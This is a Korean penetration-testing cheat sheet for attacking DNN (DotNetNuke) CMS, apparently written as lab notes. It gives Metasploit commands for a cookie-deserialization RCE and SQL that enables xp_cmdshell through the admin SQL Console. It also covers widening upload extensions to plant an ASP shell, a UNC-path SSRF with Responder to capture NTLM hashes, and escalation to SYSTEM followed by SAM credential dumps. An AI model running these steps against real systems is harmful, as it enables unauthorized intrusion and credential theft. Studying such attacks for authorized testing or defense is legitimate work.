# DNN

# DNN (DotNetNuke)

.NET 기반 CMS. 기업 인트라넷/개발서버에서 종종 발견된다. 백엔드로 MSSQL을 쓰고, 관리자 패널에 SQL 콘솔이 내장되어 있어서 관리자 크리덴셔만 확보하면 RCE까지 매우 짧다.

---

## 1. 열거

```bash
nmap -sV -p 80,443 <IP>
curl -s http://<IP>/ | grep -i dotnetnuke

# 버전 확인 (관리자 로그인 후 Settings -> Reports -> Available Updates)
# 설치 잔여 파일 노출 확인 (구버전에서 흔함)
curl -s http://<IP>/InstallWizard.aspx

# DB 파일 직접 노출 확인 (설치 실수)
curl -s http://<IP>/App_Data/Database.mdf -o test.mdf
```

---

## 2. 인증 없이/저권한으로 RCE (구버전, 가장 강력)

쿼키 역직렬화 취약점(CVE-2018-15811/15812/18325/18326)으로, 관리자 크리덴셔가 아예 없어도 RCE가 가능한 경우가 있다.

```
DNN 7.x ~ 9.1.x  : 인증 없이 익스플로잇 가능
DNN 9.2.x 이상  : 검증된 저권한 계정만 있으면 가능
```

```bash
msf6 > use exploit/windows/http/dnn_cookie_deserialization_rce
msf6 > set RHOSTS <IP>   # ← 수정
msf6 > set LHOST <칼리IP>   # ← 수정
msf6 > run
```

모듈이 패치된 버전별로 맞는 경로를 자동 선택해준다. 관리자 크리덴셔가 없을 때 가장 먼저 시도해볼 만한 경로다.

---

## 3. 관리자 로그인 후 — SQL Console을 통한 RCE (웹앱 경유 xp_cmdshell)

DNN 관리자로 로그인하면 Settings 안에 SQL Console이 있다. 이건 **1433번 포트에 직접 접속하는 게 아니라, 웹앱이 대신 MSSQL에 쿼리를 전달해주는 경로**라는 점이 중요하다. 대상의 1433번이 방화벽에 막혀있거나 외부에 노출 안 된 상태라도, 웹앱 관리자 권한만 있으면 이 경로로 여전히 xp_cmdshell까지 가능하다. 자세한 xp_cmdshell 원리는 MSSQL 페이지 참고.

```sql
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1'
RECONFIGURE

EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'whoami /priv'
```

보통 서비스 계정(nt servicemssql$sqlexpress 등) 권한으로 나오는데, SeImpersonatePrivilege가 Enabled면 PrintSpoofer 등으로 SYSTEM까지 상승 가능하다 (06_SeImpersonatePrivilege_Potato 참고).

---

## 4. 파일 업로드 확장자 우회

### 4-1. 관리자가 직접 허용 확장자 바꾸기 (우리가 실습한 방법)

```
Settings -> Security -> More -> More Security Settings -> Allowable File Extensions
여기에 exe, asp, aspx 등을 추가하고 Save
```

```bash
# 업로드
http://<IP>/admin/file-management
# 업로드 후 우클릭 -> Get URL 또는 직접 경로 추측
http://<IP>/Portals/0/shell.asp
```

### 4-2. CVE-2025-32035 — 인증 없이 확장자 검증 자체를 우회 (9.13.2 미만)

DNN이 파일 내용은 안 보고 확장자만 체크한다는 점을 이용. 실행파일을 허용된 확장자(.jpg 등)로 이름만 바꾸면 업로드 자체는 통과된다 (단독으로는 실행 안 되고, 다른 취약점과 결합해야 실행까지 이어짐). 관리자 권한 없이도 업로드 자체는 가능하다는 게 핵심, 9.13.2 이상으로 패치된지 버전 확인 필요.

---

## 5. SSRF + UNC 강제 인증 (NTLM 해시 캐프처, 고난이도)

`DnnImageHandler`의 경로 처리 결함으로, DNN 서버가 공격자가 지정한 UNC 경로(`\\attacker\share\img.png`)를 불러오도록 강제하는 semi-blind SSRF가 가능하다. MSSQL 페이지의 UNC 해시 캐프처(xp_dirtree 등)와 같은 원리로, Responder를 결얰하면 NTLM 해시를 훈칠 수 있다.

```bash
# 칼리에서 Responder 대기
sudo responder -I <인터페이스> -wv

# DNN이 UNC 경로를 불러오도록 유도 (취약한 엔드포인트/파라미터 필요, 버전별 다름)
# 9.13.9 미만 버전에서 확인
```

내부 포트스캔/클라우드 메타데이터 서비스 탐지에도 쓰일 수 있음 (방화벽으로 막힌 내부 호스트를 DNN을 통해 간접적으로 스캔).

---

## 6. 권한상승 연계

xp_cmdshell로 얻은 셔은 보통 낮은 권한의 서비스 계정이다. `whoami /priv`로 SeImpersonatePrivilege 확인 후 PrintSpoofer/GodPotato 등으로 SYSTEM까지 올리고, SAM/SYSTEM/SECURITY 덤프로 도메인 첫 크리덴셔를 확보한다.

```
06_SeImpersonatePrivilege_Potato → SYSTEM 상승
08_SAM_SYSTEM_덤프 → 로컬/도메인 크리덴셔 확보
```

---

## 팁

- 관리자 크리덴셔는 설정 파일(web.config), 노출된 DB 파일(Database.mdf), NFS/SMB 공유된 소스코드 안에서 평문으로 발견되는 경우가 많다
- SQL Console은 한 줄씩 입력해서 Run Script 하는 구조라, 한 번에 여러 줄 넣으면 일부만 실행되는 경우가 있으니 결과 확인할 것
- 업로드/설정 변경은 서버 재부팅 시 초기화될 수 있음 (xp_cmdshell, 허용 확장자 등) — 재부팅 의심되면 다시 확인